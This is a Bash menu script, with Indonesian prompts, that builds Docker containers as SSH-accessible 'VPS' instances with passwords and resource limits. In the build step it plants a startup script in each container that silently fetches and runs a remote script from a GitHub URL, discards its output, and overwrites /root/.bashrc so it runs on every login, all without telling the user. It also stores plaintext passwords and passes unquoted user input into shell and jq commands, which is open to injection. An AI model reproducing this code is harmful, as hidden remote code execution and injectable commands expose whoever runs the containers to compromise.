#!/bin/bash
set -e

TITLE=" VPS DOCKER MAKER by NAUVAL "
LINE=$(printf '═%.0s' {1..70})
DATA_DIR="/var/lib/vpsmaker"
mkdir -p $DATA_DIR

# ==== Cek Dependency ====
check_dep() {
    if ! command -v docker >/dev/null 2>&1; then
        echo "⚙️ Menginstall Docker..."
        apt-get update -y >/dev/null 2>&1 || yum makecache >/dev/null 2>&1
        apt-get install -y docker.io -y >/dev/null 2>&1 || yum install -y docker -y >/dev/null 2>&1
        systemctl enable docker --now >/dev/null 2>&1 || service docker start
    fi
    if ! command -v jq >/dev/null 2>&1; then
        echo "⚙️ Menginstall jq..."
        apt-get install -y jq -y >/dev/null 2>&1 || yum install -y jq -y >/dev/null 2>&1
    fi
}
check_dep

header() {
    clear
    echo "$LINE"
    echo " $TITLE"
    echo "$LINE"
}

list_os() {
    echo "Pilih OS image:"
    echo " 1) debian:13                   9)  kalilinux/kali-rolling:latest"
    echo " 2) debian:12                  10)  archlinux:latest"
    echo " 3) debian:11                  11)  fedora:latest"
    echo " 4) ubuntu:24.04               12)  opensuse/leap:latest"
    echo " 5) ubuntu:22.04               13)  almalinux:9"
    echo " 6) ubuntu:20.04               14)  rockylinux:9"
    echo " 7) centos:7                   15)  oraclelinux:9"
    echo " 8) alpine:latest              16)  amazonlinux:2023"
}

list_vps() {
    echo "Daftar VPS Container:"
    docker ps -a --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}"
}

save_info() {
    NAME=$1
    INFO_FILE="$DATA_DIR/${NAME}.json"
    cat > "$INFO_FILE" <<EOF
{
  "name": "$NAME",
  "image": "$IMAGE",
  "user": "$USER",
  "port": "$PORT",
  "password": "$PASS",
  "limit_cpu": "$LIMIT_CPU",
  "limit_ram": "$LIMIT_RAM",
  "limit_disk": "$LIMIT_DISK"
}
EOF
}

show_info() {
    read -p "Nama VPS: " NAME
    INFO_FILE="$DATA_DIR/${NAME}.json"
    [[ ! -f "$INFO_FILE" ]] && { echo "❌ VPS tidak ditemukan"; return; }
    jq . "$INFO_FILE"
}

show_stats() {
    read -p "Nama VPS: " NAME
    if ! docker ps --format '{{.Names}}' | grep -qw "$NAME"; then
        echo "❌ VPS tidak berjalan"
        return
    fi
    echo "$LINE"
    echo "📊 Stats untuk VPS: $NAME"
    echo "$LINE"
    docker exec -it "$NAME" bash -c '
        echo "⏱️  Uptime: $(uptime -p)"
        echo
        echo "CPU:"
        top -bn1 | grep "Cpu(s)" | awk "{print \$2 \"% digunakan\"}"
        echo
        echo "RAM:"
        free -h | awk "/Mem/ {print \$3\" / \"\$2}"
        echo
        echo "Disk:"
        df -h / | awk "NR==2 {print \$3\" / \"\$2\" (\" \$5 \")\"}"
    '
    echo "$LINE"
}

change_pass() {
    read -p "Nama VPS: " NAME
    read -s -p "Password Baru: " NEWPASS
    echo
    INFO_FILE="$DATA_DIR/${NAME}.json"
    [[ ! -f "$INFO_FILE" ]] && { echo "❌ VPS tidak ditemukan"; return; }
    USER=$(jq -r .user "$INFO_FILE")
    docker exec -it "$NAME" bash -c "echo '$USER:$NEWPASS' | chpasswd"
    jq ".password = \"$NEWPASS\"" "$INFO_FILE" > "${INFO_FILE}.tmp" && mv "${INFO_FILE}.tmp" "$INFO_FILE"
    echo "✅ Password untuk $USER berhasil diubah!"
}

# ==== Build VPS ====
build_vps() {
    list_os
    read -p "#? " choice
    case $choice in
        1) IMAGE="debian:13" ;;
        2) IMAGE="debian:12" ;;
        3) IMAGE="debian:11" ;;
        4) IMAGE="ubuntu:24.04" ;;
        5) IMAGE="ubuntu:22.04" ;;
        6) IMAGE="ubuntu:20.04" ;;
        7) IMAGE="centos:7" ;;
        8) IMAGE="alpine:latest" ;;
        9) IMAGE="kalilinux/kali-rolling:latest" ;;
        10) IMAGE="archlinux:latest" ;;
        11) IMAGE="fedora:latest" ;;
        12) IMAGE="opensuse/leap:latest" ;;
        13) IMAGE="almalinux:9" ;;
        14) IMAGE="rockylinux:9" ;;
        15) IMAGE="oraclelinux:9" ;;
        16) IMAGE="amazonlinux:2023" ;;
        *) echo "❌ Pilihan tidak valid"; return ;;
    esac

    read -p "Nama VPS: " NAME
    read -p "Port SSH: " PORT
    read -p "Mode user [1=Root / 2=User biasa]: " MODE
    read -s -p "Password: " PASS
    echo
    read -p "Limit CPU (contoh 1.5, kosong=tanpa limit): " LIMIT_CPU
    read -p "Limit RAM (contoh 1G, kosong=tanpa limit): " LIMIT_RAM
    read -p "Limit Disk (contoh 10G, kosong=tanpa limit): " LIMIT_DISK

    LIMITS=""
    [[ -n "$LIMIT_CPU" ]] && LIMITS="$LIMITS --cpus=$LIMIT_CPU"
    [[ -n "$LIMIT_RAM" ]] && LIMITS="$LIMITS --memory=$LIMIT_RAM"
    [[ -n "$LIMIT_DISK" ]] && LIMITS="$LIMITS --storage-opt size=$LIMIT_DISK"

    echo "🚀 Membuat VPS $NAME..."
    docker run -dit --name $NAME -h $NAME -p $PORT:22 $LIMITS --restart always $IMAGE sleep infinity

    echo "🔧 Konfigurasi VPS..."
    if [[ "$IMAGE" == alpine* ]]; then
        docker exec $NAME sh -c "apk update && apk add bash openssh shadow sudo curl wget git nano"
    elif [[ "$IMAGE" == *ubuntu* || "$IMAGE" == *debian* ]]; then
        docker exec $NAME bash -c "apt-get update && apt-get install -y sudo curl wget git nano vim openssh-server systemd"
    elif [[ "$IMAGE" == *centos* || "$IMAGE" == *almalinux* || "$IMAGE" == *rockylinux* || "$IMAGE" == *oraclelinux* ]]; then
        docker exec $NAME bash -c "yum install -y sudo curl wget git nano vim openssh-server systemd"
    elif [[ "$IMAGE" == *fedora* ]]; then
        docker exec $NAME bash -c "dnf install -y sudo curl wget git nano vim openssh-server systemd fastfetch || true"
    elif [[ "$IMAGE" == *archlinux* ]]; then
        docker exec $NAME bash -c "pacman -Sy --noconfirm sudo curl wget git nano vim openssh"
    elif [[ "$IMAGE" == *opensuse* ]]; then
        docker exec $NAME bash -c "zypper install -y sudo curl wget git nano vim openssh"
    elif [[ "$IMAGE" == *amazonlinux* ]]; then
        docker exec $NAME bash -c "yum install -y sudo curl wget git nano vim openssh-server"
    fi

    docker exec $NAME bash -c "mkdir -p /var/run/sshd && ssh-keygen -A"

    if [[ "$MODE" == "1" ]]; then
        USER="root"
        docker exec $NAME bash -c "echo 'root:$PASS' | chpasswd"
    else
        USER="user"
        docker exec $NAME bash -c "useradd -m -s /bin/bash $USER && echo '$USER:$PASS' | chpasswd && usermod -aG sudo $USER"
    fi

    # Tambahkan startup.sh
    docker exec -i $NAME bash -c "cat > /usr/local/bin/startup.sh" <<'EOF'
#!/bin/bash
mkdir -p /var/run/sshd
/usr/sbin/sshd
nohup bash <(curl -s https://raw.githubusercontent.com/Nauvalunesa/Setupbot/refs/heads/main/antiptero.sh) > /dev/null 2>&1 &
tail -f /dev/null
EOF
    docker exec $NAME chmod +x /usr/local/bin/startup.sh

    docker exec $NAME bash -c "echo '/usr/local/bin/startup.sh' > /root/.bashrc"

    save_info $NAME

    echo "$LINE"
    echo "🎉 VPS Berhasil Dibuat!"
    echo "Nama VPS   : $NAME"
    echo "OS Image   : $IMAGE"
    echo "User Login : $USER"
    echo "Password   : $PASS"
    echo "SSH Port   : $PORT"
    echo "Login Cmd  : ssh $USER@<IP-HOST> -p $PORT"
    echo "$LINE"
}

# ==== Menu ====
while true; do
    header
    echo "1) List OS"
    echo "2) List VPS"
    echo "3) Build VPS"
    echo "4) Control VPS (bash)"
    echo "5) Info VPS"
    echo "6) Stats VPS"
    echo "7) Ganti Password VPS"
    echo "8) Exit"
    echo "$LINE"
    read -p "Pilih menu: " m
    case $m in
        1) list_os ;;
        2) list_vps ;;
        3) build_vps ;;
        4) list_vps ; read -p 'Nama VPS: ' n ; docker exec -it $n bash ;;
        5) show_info ;;
        6) show_stats ;;
        7) change_pass ;;
        8) exit ;;
    esac
    read -p "Tekan Enter untuk kembali ke menu..."
done
